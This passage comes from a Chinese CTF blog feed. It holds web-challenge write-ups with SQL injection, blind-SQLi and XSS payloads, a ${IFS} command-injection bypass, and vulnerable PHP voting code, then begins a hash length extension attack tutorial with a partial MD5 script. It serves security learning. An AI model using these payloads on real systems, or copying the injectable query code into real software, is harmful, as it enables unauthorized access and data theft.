class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">“password”</span> <span class="hljs-attribute">placeholder</span>=<span class="hljs-value">“password”</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-title">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-title">br</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">“submit”</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">“Go!”</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-title">center</span>&gt;</span><br><br></code></pre><br><p>代码逻辑很明确,首先在login.php生成./log/xxx.log <br><br>接着访问index.php即可<br></p><br><h2 id="0x06-http-头注入">0x06 http 头注入</h2><br><p><a href="http://218.76.35.75:20121" target="_blank" rel="external">链接</a> <br><br>经过一番测试发现在referer处有报错<br></p><br><p>具体的利用方法是insert注入，可以参考我<a href="http://blog.csdn.net/qq_31481187/article/details/59727015#t23" target="_blank" rel="external">以前写的文章</a></p><br><p>具体的payload:<code>1123’ or extractvalue(1,concat(0x5c,(select flag from flag))) or ‘’,’123’)#</code></p><br><h2 id="0x07-简单的文件上传">0x07 简单的文件上传</h2><br><p><a href="http://218.76.35.75:20122" target="_blank" rel="external">链接</a> <br><br>不懂是什么意思 上传个php文件就可以<br></p><br><h2 id="0x08-简单的js">0x08 简单的JS</h2><br><p><a href="http://218.76.35.75:20123" target="_blank" rel="external">链接</a></p><br><p>这个也是摸不到头脑，赋值粘贴执行初来链接 <br><br><code><a href="http://218.76.35.75:20123/fl0a.php" target="_blank" rel="external">http://218.76.35.75:20123/fl0a.php</a></code> <br><br>查看cookie 得到flag<br><br></p><br><h2 id="0x09-php-是门松散的语言">0x09 php 是门松散的语言</h2><br><p><a href="http://218.76.35.75:20124" target="_blank" rel="external">链接</a> <br><br>可以把它归结为简单的变量覆盖 <br><br>parse_str导致的漏洞 <br><br>最后的payload <br><br><code><a href="http://218.76.35.75:20124/?heetian=he%3Dabcd" target="_blank" rel="external">http://218.76.35.75:20124/?heetian=he%3Dabcd</a></code><br><br><br><br></p><br><h2 id="0x0a-试试xss">0x0a 试试xss</h2><br><p><a href="http://218.76.35.75:20125/" target="_blank" rel="external">链接</a> <br><br>有回显的 <br><br><code>‘ onerror=”javasript:alert(document.domain)”</code><br><br></p><br><h2 id="0x0b-简单的文件包含">0x0b 简单的文件包含</h2><br><p><a href="http://218.76.35.75:20126" target="_blank" rel="external">链接</a> <br><br>直接包含文件,看源码得到flag<br></p><br><h2 id="0x0c-简单的验证">0x0c 简单的验证</h2><br><p><a href="218.76.35.75:20127" target="_blank" rel="external">链接</a> <br><br>看cookie有个guess字段 <br><br>直接爆破admin对应的guess值<br><br></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170814163135715?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><h2 id="0x0d-vote">0x0d vote</h2><br><p><a href="http://218.76.35.75:65080/" target="_blank" rel="external">链接</a> <br><br>这个题目，和我出的一道题目神似<a href="https://github.com/actionyz/Web/tree/master/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5" target="_blank" rel="external">下载链接</a> <br><br>找到备份源码之后用虚拟机vim还原<br><br></p><br><pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">‘db.php’</span>;<br>session_start();<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘login’</span>])) {<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘login’</span>] = <span class="hljs-string">‘guest’</span>.mt_rand(<span class="hljs-number">1e5</span>, <span class="hljs-number">1e6</span>);<br>}<br><span class="hljs-variable">$login</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘login’</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘submit’</span>])) {<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘id’</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘vote’</span>]) || !is_numeric(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘id’</span>]))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">‘please select …’</span>);<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘id’</span>];<br>    <span class="hljs-variable">$vote</span> = (int)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘vote’</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vote</span> &gt; <span class="hljs-number">5</span> || <span class="hljs-variable">$vote</span> &lt; <span class="hljs-number">1</span>)<br>        <span class="hljs-variable">$vote</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-variable">$q</span> = mysql_query(<span class="hljs-string">“INSERT INTO t_vote VALUES ({$id}, {$vote}, ‘{$login}’)”</span>);<br>    <span class="hljs-variable">$q</span> = mysql_query(<span class="hljs-string">“SELECT id FROM t_vote WHERE user = ‘{$login}’ GROUP BY id”</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">‘&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;’</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">‘&lt;table border=”1”&gt;’</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">‘&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;’</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$r</span> = mysql_fetch_array(<span class="hljs-variable">$q</span>)) {<br>        <span class="hljs-variable">$arr</span> = mysql_fetch_array(mysql_query(<span class="hljs-string">“SELECT title FROM t_picture WHERE id = “</span>.<span class="hljs-variable">$r</span>[<span class="hljs-string">‘id’</span>]));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">‘&lt;tr&gt;&lt;td&gt;’</span>.<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>].<span class="hljs-string">‘&lt;/td&gt;’</span>;<br>        <span class="hljs-variable">$arr</span> = mysql_fetch_array(mysql_query(<span class="hljs-string">“SELECT COUNT(value), AVG(value) FROM t_vote WHERE id = “</span>.<span class="hljs-variable">$r</span>[<span class="hljs-string">‘id’</span>]));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">‘&lt;td&gt;’</span>.<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>].<span class="hljs-string">‘&lt;/td&gt;&lt;td&gt;’</span>.round(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>).<span class="hljs-string">‘&lt;/td&gt;&lt;/tr&gt;’</span>;<br>    }<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">‘&lt;/table&gt;’</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">‘&lt;br&gt;&lt;a href=”index.php”&gt;goBack&lt;/a&gt;&lt;br&gt;’</span>;<br>    <span class="hljs-keyword">exit</span>;<br>}<br><span class="hljs-preprocessor">?&gt;</span></span><br><span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-title">title</span>&gt;</span>Movie vote<span class="hljs-tag">&lt;/<span class="hljs-title">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">p</span>&gt;</span>Welcome, Movie vote<span class="hljs-tag">&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">action</span>=<span class="hljs-value">“index.php”</span> <span class="hljs-attribute">method</span>=<span class="hljs-value">“POST”</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">table</span> <span class="hljs-attribute">border</span>=<span class="hljs-value">“1”</span> <span class="hljs-attribute">cellspacing</span>=<span class="hljs-value">“5”</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">tr</span>&gt;</span><br><span class="php"><span class="hljs-preprocessor">&lt;?php</span><br><span class="hljs-variable">$q</span> = mysql_query(<span class="hljs-string">‘SELECT * FROM t_picture’</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$r</span> = mysql_fetch_array(<span class="hljs-variable">$q</span>)) {<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">‘&lt;td&gt;&lt;img src=”./images/‘</span>.<span class="hljs-variable">$r</span>[<span class="hljs-string">‘image’</span>].<span class="hljs-string">‘“&gt;&lt;div align=”center”&gt;’</span>.<span class="hljs-variable">$r</span>[<span class="hljs-string">‘title’</span>].<span class="hljs-string">‘&lt;br&gt;&lt;input type=”radio” name=”id” value=”‘</span>.<span class="hljs-variable">$r</span>[<span class="hljs-string">‘id’</span>].<span class="hljs-string">‘“&gt;&lt;/div&gt;&lt;/td&gt;’</span>;<br>}<br><span class="hljs-preprocessor">?&gt;</span></span><br><span class="hljs-tag">&lt;/<span class="hljs-title">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">table</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">p</span>&gt;</span>Your vote:<br><span class="hljs-tag">&lt;<span class="hljs-title">select</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">“vote”</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">option</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">“1”</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-title">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">option</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">“2”</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-title">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">option</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">“3”</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-title">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">option</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">“4”</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-title">option</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">option</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">“5”</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-title">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">select</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">“submit”</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">“submit”</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">“Submit”</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span><br></code></pre><br><p>经过观察可控字段只能是id <br><br>所以id是注入点 <br><br>经过二次注入之后，找到flag <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170814173522394?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br></p><br><p>写的不太详细，不懂得可以私我</p><br><h2 id="0x0e-gg">0x0e GG</h2><br><p><a href="http://218.76.35.75:65380/" target="_blank" rel="external">链接</a> <br><br>利用网页js美化 <br><br>找到关键点，结束时的处理函数<br><br></p><br><pre class="prettyprint"><code class=" hljs actionscript"> <span class="hljs-keyword">this</span>.mayAdd = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(a)</span> {</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.scores.length &lt; <span class="hljs-keyword">this</span>.maxscores) <span class="hljs-keyword">return</span> <span class="hljs-number">1E6</span> &lt; a &amp;&amp; (a = <span class="hljs-keyword">new</span> p, a.<span class="hljs-keyword">set</span>(<span class="hljs-string">“urlkey”</span>, <span class="hljs-string">“webqwer”</span> [<span class="hljs-number">1</span>] + <span class="hljs-string">“100.js”</span>, <span class="hljs-number">864E5</span>)), !<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> b = <span class="hljs-keyword">this</span>.scores.length - <span class="hljs-number">1</span>; <span class="hljs-number">0</span> &lt;= b; –b)<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.scores[b].score &lt; a) <span class="hljs-keyword">return</span> <span class="hljs-number">1E6</span> &lt; a &amp;&amp; (a = <span class="hljs-keyword">new</span> p, a.<span class="hljs-keyword">set</span>(<span class="hljs-string">“urlkey”</span>,<br>                    <span class="hljs-string">“webqwer”</span> [<span class="hljs-number">1</span>] + <span class="hljs-string">“100.js”</span>, <span class="hljs-number">864E5</span>)), !<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-number">1</span><br>        };</code></pre><br><p>访问e100.js <br><br>得到另一种js编码方式，直接console执行代码及可<br></p><br><h2 id="0x0f-reappear">0x0f Reappear</h2><br><p><a href="http://218.76.35.75:65180/" target="_blank" rel="external">链接</a> <br><br>直接查找相关漏洞<a href="http://www.jb51.net/hack/198171.html" target="_blank" rel="external">漏洞内容</a><br></p><br><p>路径泄露 <br><br>找到 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170814182548358?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>flag文件名已经找到了 <br><br>直接搜索就OK<code>/var/www/html/Web/kind/kindeditor/attached/flag_clue.php</code><br><br><br><br></p><br><h2 id="0x10-drinkcoffee">0x10 DrinkCoffee</h2><br><p><a href="http://218.76.35.75:65280/" target="_blank" rel="external">链接</a> <br><br>直接改两个字段 <br><br><code>referer</code>和<code>X_FORWARDED_FOR</code> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170814233633905?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br></p><br><h2 id="0x11-最安全的笔记管理系统">0x11 最安全的笔记管理系统</h2><br><p><a href="http://218.76.35.74:20128" target="_blank" rel="external">链接</a> <br><br>这道题目的思路挺不错的<br></p><br><h3 id="0x1-sql注入分析">0x1 SQL注入分析</h3><br><p>一开始拿到题目以为是SQL注入，首先分析一下waf检测 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170818181116273?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>发现是有转义的，所以又测试了编码绕过，无果。 <br><br>下面开始寻找二次注入的地方，也没有发现。 <br><br>那么注入是不可能的了<br><br><br><br></p><br><h3 id="0x2-代码审计">0x2 代码审计</h3><br><p>因为SQL注入无果所以开始转向其他思路。发现网页本身存在文件包含漏洞，利用PHP filter协议进行读取PHP代码 <br><br>得到整个源代码后开始代码审计 登录之后会有session以及cookie的设置 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170818181819404?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>在目录扫描之后发现有admin目录，admin/index.php有用户身份检测 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170818182012136?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>同时<code>$userid!==false&amp;&amp;level!==false</code> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170818182153703?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>应为初始值的原因所以<code>$userid!==false&amp;&amp;level!==false</code>是成立的 <br><br>下面就看身份检测函数就可以了 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170818181910755?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>如果是想要绕过这里的检测 我们必须要知道SECURITY_KEY的值，也就是要知道rand的值。后来搜了一下找到了相关知识 <br><br><a href="https://www.leavesongs.com/PENETRATION/safeboxs-secret.html" target="_blank" rel="external">这里写链接内容</a> <br><br>于是在本地测试是可以登录admin的但是在本题死活登不上，下面的工作就是二次注入。因为没有登录admin所以也没有继续写。<br><br><br><br><br><br><br><br><br><br><br><br></p><br><h2 id="0x12-document">0x12 Document</h2><br><p><a href="http://218.76.35.74:20129" target="_blank" rel="external">链接</a> <br><br>试了半天，还好有同学提示，这题考察的是apache解析漏洞<br></p><br><h2 id="0x13-阳光总在风雨后">0x13 阳光总在风雨后</h2><br><p><a href="http://218.76.35.74:20130" target="_blank" rel="external">链接</a> <br><br>一开始会检测username所以在这里存在有盲注 <br><br>绕过姿势<code>uname=admin’/1=(1=(exists(select(1)from(admin))))/‘1’=’1&amp;passwd=ad</code> <br><br>或者<code>1’%(1)%’1</code> 或者 <code>1’^!1^’1</code> <br><br>脚本就不贴了，如果不会可以参考我<a href="http://blog.csdn.net/qq_31481187/article/details/59727015#t24" target="_blank" rel="external">以前的博客</a> <br><br>得到密码<code>50f87a3a3ad48e26a5d9058418fb78b5</code> <br><br>碰撞得到<code>shuangshuang</code> <br><br>后面是一个命令执行的绕过 <br><br>可以用${IFS}也可以是其他这里有些<a href="http://blog.csdn.net/qq_27446553/article/details/73927518" target="_blank" rel="external">小trick</a> <br><br>最后只显示最后一行 这里可以用<code>tail -n +3000 | head -n 1000</code>指定显示第几行 <br><br>搜索到9ef89ad913e848b64b73e3aa721e44e4目录 <br><br>接着找到flag文件<code>ls${IFS}/var/www/html/9ef89ad913e848b64b73e3aa721e44e4/|head${IFS}-n${IFS}1</code><br><br><br><br><br><br><br><br><br><br><br></p><br><h2 id="0x14-default">0x14 default</h2><br><p><a href="http://218.76.35.74:20131/" target="_blank" rel="external">链接</a></p><br><p>首先是扫描到index2.php <br><br>接着就好写了 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170818192641738?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br></p></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;趁着放假，再刷一波题目&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="write-up" scheme="http://yoursite.com/tags/write-up/"/>
    
  </entry>
  
  <entry>
    <title>Hash length extension attacks 分析</title>
    <link href="http://yoursite.com/2017/07/04/Hash%20length%20extension%20attacks%20%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/07/04/Hash length extension attacks 分析/</id>
    <published>2017-07-03T17:27:00.000Z</published>
    <updated>2017-10-22T02:14:24.023Z</updated>
    
    <content type="html"><![CDATA[<p>0x00 MD5加密原理0x1 字节填充0x2 分组加密0x3 实例演示0x01 攻击原理0x02 攻击脚本0x1 md5 python 实现0x2 计算脚本0x03 实例演示0x1 简单实例0x2 jarvisoj flag在管理员手里方法一 利用hash_extender方法二 利用上述脚本0x3 adminstep 1 初步审计step 2 直接解密解法一ste<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><p><div class="toc"><div class="toc"><br><ul><br><li><a href="#0x00-md5加密原理">0x00 MD5加密原理</a><ul><br><li><a href="#0x1-字节填充">0x1 字节填充</a></li><br><li><a href="#0x2-分组加密">0x2 分组加密</a></li><br><li><a href="#0x3-实例演示">0x3 实例演示</a></li><br></ul><br></li><br><li><a href="#0x01-攻击原理">0x01 攻击原理</a></li><br><li><a href="#0x02-攻击脚本">0x02 攻击脚本</a><ul><br><li><a href="#0x1-md5-python-实现">0x1 md5 python 实现</a></li><br><li><a href="#0x2-计算脚本">0x2 计算脚本</a></li><br></ul><br></li><br><li><a href="#0x03-实例演示">0x03 实例演示</a><ul><br><li><a href="#0x1-简单实例">0x1 简单实例</a></li><br><li><a href="#0x2-jarvisoj-flag在管理员手里">0x2 jarvisoj flag在管理员手里</a><ul><br><li><a href="#方法一-利用hashextender">方法一 利用hash_extender</a></li><br><li><a href="#方法二-利用上述脚本">方法二 利用上述脚本</a></li><br></ul><br></li><br><li><a href="#0x3-admin">0x3 admin</a><ul><br><li><a href="#step-1-初步审计">step 1 初步审计</a></li><br><li><a href="#step-2-直接解密解法一">step 2 直接解密解法一</a></li><br><li><a href="#step-3-利用hash拓展攻击没有必要">step 3 利用hash拓展攻击没有必要</a></li><br></ul><br></li><br></ul><br></li><br></ul><br></div><br></div><br></p><br><blockquote><br><p>最近突然想把以前做的哈希拓展长度攻击的原理给梳理一下，前一段时间梳理了 padding  oracle attack的<a href="http://blog.csdn.net/qq_31481187/article/details/71773789" target="_blank" rel="external">相关知识</a>，打算从原理到题目都详细的讲一讲,使用条件比较苛刻需要攻击者明密文都可控，所以在平时这种漏洞很少见，后面主要介绍一下工具的使用方法以及，jarvis平台上的一道题目，以及2017年陕西省信息安全竞赛的最后一道题目admin</p><br></blockquote><br><p>哈希拓展可以伪造任意一对明密文，前提是有一对明密文，且伪造的明文前512比特是固定的···</p><br><h1 id="0x00-md5加密原理">0x00 MD5加密原理</h1><br><p>一些dalao的博客这一点已经说得很清楚了，例如 <a href="http://blog.csdn.net/qq_35078631/article/details/70941204" target="_blank" rel="external">Assassin师傅的博文</a></p><br><h2 id="0x1-字节填充">0x1 字节填充</h2><br><p>MD5在进行运算时，需要将bit位数填充到指定位数，使其长度在对 512bit 取模后的值为 448bit，留下的64bit用来填写未填充的明文长度</p><br><h2 id="0x2-分组加密">0x2 分组加密</h2><br><p>把填充过的（注意如果明文大于512bit，将分成多个组进行加密）明文按512bit一组进行下述加密</p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170703210658509?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p>我们可以看到初始向量IV为128bit，每组加密过之后当做下一组的向量进行运算。最后输出的128bit就是md5值</p><br><h2 id="0x3-实例演示">0x3 实例演示</h2><br><p>前面MD5的加密逻辑说得很清楚，这里利用一个实例模拟一下加密过程 </p><br><table><br><thead><br><tr><br><th align="left">加密数据</th><br><th align="right">Value</th><br></tr><br></thead><br><tbody><tr><br><td align="left">十六进制</td><br><td align="right">0x61646d696e</td><br></tr><br><tr><br><td align="left">填充之后</td><br><td align="right">0x61646d696e+0x80+50<em>0x00+0x28+0x00</em>7</td><br></tr><br></tbody></table><br><p>首先字节填充，比特第一位补位1，其余位为0所以为0x80 <br><br>后面全是0字节填充一直到448bit截止，剩下的8byte按照小端方式存储。admin占位5字节所以40bit=0x28bit。 <br><br>这就是基本的MD5加密算法的流程，有没有看懂？？如果看懂了有没有发现攻击者的可乘之机？？<br><br></p><br><h1 id="0x01-攻击原理">0x01 攻击原理</h1><br><p>上篇稍微讲了一下，MD5加密的原理，这里主要讲解攻击方法 <br><br>假设我们已经知道<code>md5($secret+”admin”+”admin”)</code>的值<code>hash1</code> <br><br>其实就是<code>iv  与 $secret+”admin”+”admin”的填充值（这里填充了512bit）的hash值</code> <br><br><strong>现在假设我们有自己的hash算法可以构造任意的初始iv可以填充任意参与计算的明文</strong> <br><br>现在有以下结论 <br><br>如果我要<code>md5（$secret+”admin”+”admin”+第一组MD5填充+padding）</code>这里的第一组md5分组就是<code>md5（$secret+”admin”+”admin”）时的填充之后的512bit块</code> <br><br>那么此值应该在逻辑上等于我利用<code>hash1</code>当做初始向量加密我构造的<code>padding+填充字节（注意这里的填充是算上第一块的长度的即512bit）</code>的第二块生成的md5值<br><br><br><br><br><br></p><br><p>简单的将就是</p><br><pre class="prettyprint"><code class=" hljs bash">md5（<span class="hljs-variable">$secret</span>+”admin”+”admin”+第一组MD5填充+padding）=(<span class="hljs-built_in">hash</span>1)md5(padding+填充字节)</code></pre><br><h1 id="0x02-攻击脚本">0x02 攻击脚本</h1><br><p>这里引用别人写的脚本</p><br><h2 id="0x1-md5-python-实现">0x1 md5 python 实现</h2><br><p>可以自定义iv值</p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -<em>- coding: utf-8 -</em>-</span><br><span class="hljs-comment"># @Author：DshtAnger</span><br><span class="hljs-comment"># theory reference:</span><br><span class="hljs-comment">#   blog：</span><br><span class="hljs-comment">#       <a href="http://blog.csdn.net/adidala/article/details/28677393" target="_blank" rel="external">http://blog.csdn.net/adidala/article/details/28677393</a></span><br><span class="hljs-comment">#       <a href="http://blog.csdn.net/forgotaboutgirl/article/details/7258109" target="_blank" rel="external">http://blog.csdn.net/forgotaboutgirl/article/details/7258109</a></span><br><span class="hljs-comment">#       <a href="http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_6fe0eb1901014cpl.html</a></span><br><span class="hljs-comment">#   RFC1321：</span><br><span class="hljs-comment">#       <a href="https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf" target="_blank" rel="external">https://www.rfc-editor.org/rfc/pdfrfc/rfc1321.txt.pdf</a></span><br><span class="hljs-comment">##############################################################################</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genMsgLengthDescriptor</span><span class="hljs-params">(msg_bitsLenth)</span>:</span><br>    <span class="hljs-string">‘’’<br>    —args:<br>            msg_bitsLenth : the bits length of raw message<br>    –return:<br>            16 hex-encoded string , i.e.64bits,8bytes which used to describe the bits length of raw message added after padding<br>    ‘’’</span><br>    <span class="hljs-keyword">return</span> <strong>import</strong>(<span class="hljs-string">“struct”</span>).pack(<span class="hljs-string">“&gt;Q”</span>,msg_bitsLenth).encode(<span class="hljs-string">“hex”</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse_hex_8bytes</span><span class="hljs-params">(hex_str)</span>:</span><br>    <span class="hljs-string">‘’’<br>    –args:<br>            hex_str: a hex-encoded string with length 16 , i.e.8bytes<br>    –return:<br>            transform raw message descriptor to little-endian<br>    ‘’’</span><br>    hex_str = <span class="hljs-string">“%016x”</span>%int(hex_str,<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">assert</span> len(hex_str)==<span class="hljs-number">16</span><br>    <span class="hljs-keyword">return</span> <strong>import</strong>(<span class="hljs-string">“struct”</span>).pack(<span class="hljs-string">“&lt;Q”</span>,int(hex_str,<span class="hljs-number">16</span>)).encode(<span class="hljs-string">“hex”</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse_hex_4bytes</span><span class="hljs-params">(hex_str)</span>:</span><br>    <span class="hljs-string">‘’’<br>    –args:<br>            hex_str: a hex-encoded string with length 8 , i.e.4bytes<br>    –return:<br>            transform 4 bytes message block to little-endian<br>    ‘’’</span><br>    hex_str = <span class="hljs-string">“%08x”</span>%int(hex_str,<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">assert</span> len(hex_str)==<span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> <strong>import</strong>(<span class="hljs-string">“struct”</span>).pack(<span class="hljs-string">“&lt;L”</span>,int(hex_str,<span class="hljs-number">16</span>)).encode(<span class="hljs-string">“hex”</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deal_rawInputMsg</span><span class="hljs-params">(input_msg)</span>:</span><br>    <span class="hljs-string">‘’’<br>    –args:<br>            input_msg : inputed a ascii-encoded string<br>    –return:<br>            a hex-encoded string which can be inputed to mathematical transformation function.<br>    ‘’’</span><br>    ascii_list = [x.encode(<span class="hljs-string">“hex”</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> 